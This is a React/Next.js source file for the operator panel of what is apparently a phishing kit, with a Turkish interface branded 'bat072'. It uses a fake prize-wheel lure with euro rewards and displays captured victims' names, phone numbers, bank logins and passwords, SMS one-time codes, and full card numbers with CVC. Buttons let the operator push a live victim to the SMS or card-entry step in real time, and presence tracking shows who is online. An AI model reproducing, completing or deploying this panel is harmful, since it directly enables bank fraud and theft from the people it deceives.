"use client";

import { useCallback, useEffect, useState, useRef } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import type { DemoSession } from "@/types/session";
import { pathToStep } from "@/lib/session-routes";
import { stepToPath } from "@/lib/session-routes";
import { useRouter } from "next/navigation";

export function Admin1Dashboard() {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();
  const [rows, setRows] = useState<DemoSession[]>([]);
  const rowsRef = useRef<DemoSession[]>([]);
  useEffect(() => {
    rowsRef.current = rows;
  }, [rows]);

  const [loading, setLoading] = useState(true);
  const [isCollapsed, setIsCollapsed] = useState(false);
  const [darkMode, setDarkMode] = useState(true);

  // Stats
  const [liveVisitorCount, setLiveVisitorCount] = useState(0);
  const [logCount, setLogCount] = useState(0);
  const [bannedCount, setBannedCount] = useState(0);

  // Presence
  const [onlineSessionIds, setOnlineSessionIds] = useState<Set<string>>(new Set());
  const [sessionPaths, setSessionPaths] = useState<Record<string, string>>({});

  const load = useCallback(async () => {
    if (!supabase) return;
    setLoading(true);
    const { data } = await supabase
      .from("sessions")
      .select("*")
      .neq("is_hidden", true)
      .order("created_at", { ascending: false })
      .limit(50);
    
    const fetchedRows = (data as DemoSession[]) ?? [];
    setRows(fetchedRows);
    setLogCount(fetchedRows.length);
    setLoading(false);
  }, [supabase]);

  useEffect(() => {
    void load();
    if (!supabase) return;

    // Banned count
    supabase.from("banned_ips").select("id", { count: 'exact' }).then(({ count }) => {
      setBannedCount(count ?? 0);
    });

    const channel = supabase
      .channel("admin1-sessions-live")
      .on("postgres_changes", { event: "*", schema: "public", table: "sessions" }, () => {
        void load();
      })
      .subscribe();

    const presenceChannel = supabase.channel('online_visitors');
    presenceChannel
      .on('presence', { event: 'sync' }, () => {
        const state = presenceChannel.presenceState();
        let count = 0;
        const activeIds = new Set<string>();
        const paths: Record<string, string> = {};

        for (const [key, presences] of Object.entries(state)) {
          const typedPresences = presences as Array<{ sessionId?: string; pathname?: string }>;
          if (typedPresences.length === 0) continue;

          const hasVisitorPresence = typedPresences.some((p) =>
            p.pathname ? !p.pathname.startsWith('/admin') : true,
          );
          if (hasVisitorPresence) count++;

          for (const p of typedPresences) {
            if (p.sessionId) {
              activeIds.add(p.sessionId);
              if (p.pathname) paths[p.sessionId] = p.pathname;
            }
          }
        }
        setLiveVisitorCount(count);
        setOnlineSessionIds(activeIds);
        setSessionPaths(paths);
      })
      .subscribe();

    return () => {
      void supabase.removeChannel(channel);
      void supabase.removeChannel(presenceChannel);
    };
  }, [supabase, load]);

  const copyToClipboard = (text: string) => {
    if (!text) return;
    navigator.clipboard.writeText(text);
    // Basit bir bildirim eklenebilir
  };

  const handleRedirect = async (sessionId: string, step: string) => {
    if (!supabase) return;
    await supabase.from("sessions").update({ current_step: step }).eq("id", sessionId);
  };

  const handleDelete = async (sessionId: string) => {
    if (!confirm("Bu logu silmek (gizlemek) istediğinize emin misiniz?")) return;
    if (!supabase) return;
    await supabase.from("sessions").update({ is_hidden: true }).eq("id", sessionId);
    void load();
  };

  return (
    <div className={`flex h-screen overflow-hidden ${darkMode ? 'bg-[#121212] text-gray-200' : 'bg-gray-50 text-gray-800'}`}>
      
      {/* SIDEBAR */}
      <div className={`flex flex-col transition-all duration-300 border-r ${darkMode ? 'bg-[#121212] border-white/10' : 'bg-white border-gray-200'} ${isCollapsed ? 'w-[80px]' : 'w-[260px]'}`}>
        <div className="h-[75px] flex items-center justify-between px-4 border-b border-white/10">
          {!isCollapsed && <span className="text-xl font-bold tracking-wider text-[#EB5E28]">bat072</span>}
          <button onClick={() => setIsCollapsed(!isCollapsed)} className={`p-2 rounded-lg ${darkMode ? 'hover:bg-white/10' : 'hover:bg-gray-100'} transition-colors ${isCollapsed ? 'mx-auto' : ''}`}>
            <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h16" /></svg>
          </button>
        </div>
        <div className="flex-1 overflow-y-auto py-4 space-y-2">
          {/* Menu Items */}
          <SidebarItem icon="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z" label="Loglar" active isCollapsed={isCollapsed} darkMode={darkMode} />
          <SidebarItem icon="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" label="Banka İşlemleri" isCollapsed={isCollapsed} darkMode={darkMode} />
          <SidebarItem icon="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9" label="Dil Ayarları" isCollapsed={isCollapsed} darkMode={darkMode} />
          <SidebarItem icon="M12 6V4m0 2a2 2 0 100 4m0-4a2 2 0 110 4m-6 8a2 2 0 100-4m0 4a2 2 0 110-4m0 4v2m0-6V4m6 6v10m6-2a2 2 0 100-4m0 4a2 2 0 110-4m0 4v2m0-6V4" label="Çark Ayarları" isCollapsed={isCollapsed} darkMode={darkMode} />
          <SidebarItem icon="M12 4.354a4 4 0 110 5.292M15 21H3v-1a6 6 0 0112 0v1zm0 0h6v-1a6 6 0 00-9-5.197M13 7a4 4 0 11-8 0 4 4 0 018 0z" label="Kullanıcı" isCollapsed={isCollapsed} darkMode={darkMode} />
          <SidebarItem icon="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z" label="Arkaplan Rengi" isCollapsed={isCollapsed} darkMode={darkMode} />
          <SidebarItem icon="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z" label="Genel Ayarlar" isCollapsed={isCollapsed} darkMode={darkMode} />
        </div>
      </div>

      {/* MAIN CONTENT */}
      <div className="flex-1 flex flex-col h-full overflow-hidden">
        {/* TOPBAR */}
        <div className={`h-[75px] border-b flex items-center justify-between px-6 shrink-0 ${darkMode ? 'border-white/10 bg-[#121212]' : 'border-gray-200 bg-white'}`}>
          <div className="text-lg font-medium opacity-80">Dashboard / Loglar</div>
          <div className="flex items-center space-x-6">
            <button onClick={() => setDarkMode(!darkMode)} className={`p-2 rounded-full ${darkMode ? 'bg-white/10 text-yellow-400' : 'bg-gray-100 text-gray-600'}`}>
              {darkMode ? (
                <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path d="M10 2a1 1 0 011 1v1a1 1 0 11-2 0V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95l.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707a1 1 0 11-1.414-1.414l.707-.707a1 1 0 011.414 0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707a1 1 0 00-1.414 1.414l.707.707zm1.414 8.486l-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z" fillRule="evenodd" clipRule="evenodd" /></svg>
              ) : (
                <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001 0 1010.586 10.586z" /></svg>
              )}
            </button>
            <button className={`flex items-center space-x-2 opacity-80 hover:opacity-100 transition-opacity`}>
              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z" /><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" /></svg>
              <span>Ayarlar</span>
            </button>
          </div>
        </div>

        {/* CONTENT */}
        <div className="flex-1 overflow-y-auto p-6 space-y-6">
          
          {/* STAT CARDS */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            <StatCard icon="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" color="text-yellow-500" title="Anlık Ziyaretçi" value={liveVisitorCount} darkMode={darkMode} />
            <StatCard icon="M5 8h14M5 8a2 2 0 110-4h14a2 2 0 110 4M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8m-9 4h4" color="text-green-500" title="Log Sayısı" value={logCount} darkMode={darkMode} />
            <StatCard icon="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636" color="text-red-500" title="Ban Sayısı" value={bannedCount} darkMode={darkMode} />
          </div>

          {/* TABLE */}
          <div className={`rounded-xl border shadow-sm overflow-hidden ${darkMode ? 'bg-[#1e1e1e] border-white/10' : 'bg-white border-gray-200'}`}>
            <div className="overflow-x-auto">
              <table className="w-full text-sm text-left">
                <thead className={`text-xs uppercase border-b ${darkMode ? 'bg-[#2a2a2a] text-gray-400 border-white/10' : 'bg-gray-50 text-gray-600 border-gray-200'}`}>
                  <tr>
                    <th className="px-4 py-4">ID</th>
                    <th className="px-4 py-4">Ödül</th>
                    <th className="px-4 py-4">İsim</th>
                    <th className="px-4 py-4">Numara</th>
                    <th className="px-4 py-4">Banka</th>
                    <th className="px-4 py-4">SMS</th>
                    <th className="px-4 py-4">Kart</th>
                    <th className="px-4 py-4">Sayfa</th>
                    <th className="px-4 py-4">Durum</th>
                    <th className="px-4 py-4">İşlemler</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-white/5">
                  {rows.length === 0 && (
                    <tr>
                      <td colSpan={10} className="px-4 py-8 text-center opacity-50">Henüz bir log yok</td>
                    </tr>
                  )}
                  {rows.map((row) => {
                    const fd = (row.form_data || {}) as Record<string, any>;
                    const isOnline = onlineSessionIds.has(row.id);
                    
                    let stepText = "BAŞLANGIÇ";
                    let stepColor = "text-gray-400 bg-gray-500/10";
                    
                    let s = row.current_step as string;
                    const livePath = sessionPaths[row.id];
                    if (isOnline && livePath) {
                      if (livePath.startsWith('/wheel')) s = "wheel";
                      else {
                        const mapped = pathToStep(livePath);
                        if (mapped) s = mapped;
                      }
                    }

                    if (s === "wheel") { stepText = "ÇARK OYUNU"; stepColor = "text-teal-400 bg-teal-500/10"; }
                    else if (s === "code_entry") {
                      if (fd.is_wheel_game) { stepText = "ÇARK OYUNU"; stepColor = "text-teal-400 bg-teal-500/10"; }
                      else { stepText = "KOD GİRİŞİ"; stepColor = "text-pink-400 bg-pink-500/10"; }
                    }
                    else if (s === "win") { stepText = "İSİM & PROFİL"; stepColor = "text-blue-400 bg-blue-500/10"; }
                    else if (s === "banken") { stepText = "BANKA SEÇİMİ"; stepColor = "text-yellow-400 bg-yellow-500/10"; }
                    else if (s === "bank_login") { stepText = "BANKA GİRİŞİ"; stepColor = "text-orange-400 bg-orange-500/10"; }
                    else if (s === "sms") { stepText = "SMS ONAYI"; stepColor = "text-indigo-400 bg-indigo-500/10"; }
                    else if (s === "card") { stepText = "KREDİ KARTI"; stepColor = "text-purple-400 bg-purple-500/10"; }
                    else if (s === "wait") { stepText = "BEKLEMEDE"; stepColor = "text-gray-400 bg-gray-500/10"; }
                    else if (s === "congrats") { stepText = "TEBRİKLER"; stepColor = "text-green-400 bg-green-500/10"; }

                    return (
                      <tr key={row.id} className={`${darkMode ? 'hover:bg-white/5' : 'hover:bg-gray-50'} transition-colors`}>
                        <td className="px-4 py-3 font-mono text-xs opacity-60" title={row.id}>{row.id.split('-')[0]}</td>
                        <td className="px-4 py-3 font-semibold text-[#EB5E28]">
                          {row.amount ? `€${row.amount}` : '-'}
                        </td>
                        <td className="px-4 py-3">
                          <div className="font-medium cursor-pointer hover:underline" onClick={() => copyToClipboard(`${fd.firstName || ''} ${fd.lastName || ''}`)}>
                            {fd.firstName || fd.lastName ? `${fd.firstName} ${fd.lastName}` : '-'}
                          </div>
                        </td>
                        <td className="px-4 py-3">
                          <div className="cursor-pointer hover:underline" onClick={() => copyToClipboard(fd.phone)}>
                            {fd.phone || '-'}
                          </div>
                        </td>
                        <td className="px-4 py-3">
                          <div className="text-xs space-y-1">
                            {fd.bankName && <div className="font-bold text-yellow-500">{fd.bankName}</div>}
                            {fd.username && <div><span className="opacity-50">K:</span> <span className="cursor-pointer hover:text-white" onClick={()=>copyToClipboard(fd.username)}>{fd.username}</span></div>}
                            {fd.password && <div><span className="opacity-50">Ş:</span> <span className="cursor-pointer hover:text-white" onClick={()=>copyToClipboard(fd.password)}>{fd.password}</span></div>}
                          </div>
                        </td>
                        <td className="px-4 py-3">
                          <div className="cursor-pointer font-mono tracking-widest text-indigo-400 hover:underline" onClick={() => copyToClipboard(fd.smsCode)}>
                            {fd.smsCode || '-'}
                          </div>
                        </td>
                        <td className="px-4 py-3">
                          <div className="text-xs space-y-1">
                            {fd.cardNumber && <div><span className="opacity-50">No:</span> <span className="cursor-pointer hover:text-white" onClick={()=>copyToClipboard(fd.cardNumber)}>{fd.cardNumber}</span></div>}
                            {fd.cardExpiry && <div><span className="opacity-50">SKT:</span> {fd.cardExpiry}</div>}
                            {fd.cardCvc && <div><span className="opacity-50">CVC:</span> {fd.cardCvc}</div>}
                          </div>
                        </td>
                        <td className="px-4 py-3">
                          <span className={`px-2 py-1 rounded text-[10px] font-bold ${stepColor}`}>
                            {stepText}
                          </span>
                        </td>
                        <td className="px-4 py-3">
                          {isOnline ? (
                            <span className="flex items-center text-green-400 text-xs font-bold">
                              <span className="w-2 h-2 rounded-full bg-green-500 mr-2 animate-pulse"></span>
                              ONLINE
                            </span>
                          ) : (
                            <span className="flex items-center text-gray-500 text-xs font-bold">
                              <span className="w-2 h-2 rounded-full bg-gray-500 mr-2"></span>
                              OFFLINE
                            </span>
                          )}
                        </td>
                        <td className="px-4 py-3">
                          <div className="flex flex-wrap gap-2 max-w-[200px]">
                            <ActionBtn label="SMS İste" onClick={() => handleRedirect(row.id, "sms")} color="bg-indigo-600 hover:bg-indigo-500" />
                            <ActionBtn label="Kart İste" onClick={() => handleRedirect(row.id, "card")} color="bg-purple-600 hover:bg-purple-500" />
                            <ActionBtn label="Tebrikler" onClick={() => handleRedirect(row.id, "congrats")} color="bg-green-600 hover:bg-green-500" />
                            <ActionBtn label="Beklet" onClick={() => handleRedirect(row.id, "wait")} color="bg-gray-600 hover:bg-gray-500" />
                            <button onClick={() => handleDelete(row.id)} className="p-1 rounded bg-red-500/20 text-red-500 hover:bg-red-500 hover:text-white transition-colors ml-auto" title="Logu Sil">
                              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg>
                            </button>
                          </div>
                        </td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>
          </div>

        </div>
      </div>
    </div>
  );
}

function SidebarItem({ icon, label, active, isCollapsed, darkMode }: { icon: string, label: string, active?: boolean, isCollapsed: boolean, darkMode: boolean }) {
  return (
    <a href="#" className={`flex items-center px-4 py-3 mx-3 rounded-lg transition-colors ${active ? (darkMode ? 'bg-[#EB5E28]/10 text-[#EB5E28]' : 'bg-[#EB5E28]/10 text-[#EB5E28]') : (darkMode ? 'text-gray-400 hover:text-white hover:bg-white/5' : 'text-gray-600 hover:text-gray-900 hover:bg-gray-100')}`}>
      <svg className={`w-5 h-5 shrink-0 ${active ? 'text-[#EB5E28]' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24">
        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d={icon} />
      </svg>
      {!isCollapsed && <span className="ml-3 font-medium text-sm">{label}</span>}
    </a>
  );
}

function StatCard({ icon, color, title, value, darkMode }: { icon: string, color: string, title: string, value: number, darkMode: boolean }) {
  return (
    <div className={`p-6 rounded-xl border flex items-center shadow-sm ${darkMode ? 'bg-[#1e1e1e] border-white/10' : 'bg-white border-gray-200'}`}>
      <div className={`w-14 h-14 shrink-0 flex items-center justify-center rounded-xl ${color.replace('text-', 'bg-').replace('500', '500/20')} ${color}`}>
        <svg className="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d={icon} /></svg>
      </div>
      <div className="ml-4">
        <div className={`text-sm font-medium ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>{title}</div>
        <div className={`text-2xl font-bold ${darkMode ? 'text-white' : 'text-gray-900'}`}>{value}</div>
      </div>
    </div>
  );
}

function ActionBtn({ label, onClick, color }: { label: string, onClick: () => void, color: string }) {
  return (
    <button onClick={onClick} className={`px-2 py-1 rounded text-[10px] font-bold text-white transition-colors shadow-sm ${color}`}>
      {label}
    </button>
  );
}